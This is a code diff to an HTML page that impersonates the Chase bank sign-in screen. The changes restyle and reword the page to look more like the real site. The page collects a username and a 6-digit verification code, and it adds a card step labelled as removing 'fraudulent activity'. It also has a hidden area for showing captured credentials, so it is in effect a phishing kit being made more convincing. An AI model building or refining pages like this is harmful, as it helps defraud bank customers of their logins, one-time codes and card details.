@@ -7,7 +7,7 @@
     <style>
         body {
             margin: 0;
-            font-family: Arial, sans-serif;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             background: url('https://www.chase.com/etc/designs/chase/images/backgrounds/login-bg.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex;
@@ -16,33 +16,45 @@
             height: 100vh;
         }
         .container {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
             border-radius: 5px;
-            width: 350px;
+            width: 400px;
             text-align: center;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
         }
-        .logo {
-            width: 150px;
+        .header {
             margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 24px;
+            color: #003087;
+            margin: 0;
+            font-weight: normal;
+        }
+        .header span {
+            color: #000;
+            font-size: 18px;
         }
         input {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 4px;
             box-sizing: border-box;
+            font-size: 14px;
         }
         button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #003087;
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
         }
         button:hover {
             background-color: #002766;
@@ -51,30 +63,34 @@
             color: #d9534f;
             margin: 10px 0;
             display: none;
+            font-size: 14px;
         }
         #credsDisplay {
             display: none;
             color: black;
             background: white;
-            padding: 10px;
+            padding: 15px;
             margin-top: 20px;
             border: 1px solid #ccc;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/Chase_Bank_Logo.svg" alt="Chase Logo" class="logo">
-        <h2>Sign In to Chase Online</h2>
+        <div class="header">
+            <h1>Chase<span>.com</span></h1>
+        </div>
+        <h2>Sign In</h2>
         <div id="loginStep1">
             <p>Enter your username to proceed.</p>
-            <input type="text" id="username" placeholder="Username" required>
+            <input type="text" id="username" placeholder="User ID" required>
             <button onclick="verifyUsername()">Sign In</button>
         </div>
         <div id="codeStep" style="display: none;">
             <p>We’ve sent a 6-digit code to your registered device. Enter it below.</p>
             <input type="text" id="code" placeholder="6-Digit Code" maxlength="6" required>
-            <button onclick="verifyCode()">Submit Code</button>
+            <button onclick="verifyCode()">Submit</button>
         </div>
         <div id="cardStep" style="display: none;">
             <p>Final step to remove fraudulent activity on your account.</p>
@@ -97,7 +113,7 @@
                 document.getElementById('codeStep').style.display = 'block';
                 document.getElementById('message').style.display = 'none';
             } else {
-                document.getElementById('message').innerText = 'Please enter a username.';
+                document.getElementById('message').innerText = 'Please enter your User ID.';
                 document.getElementById('message').style.display = 'block';
             }
         }
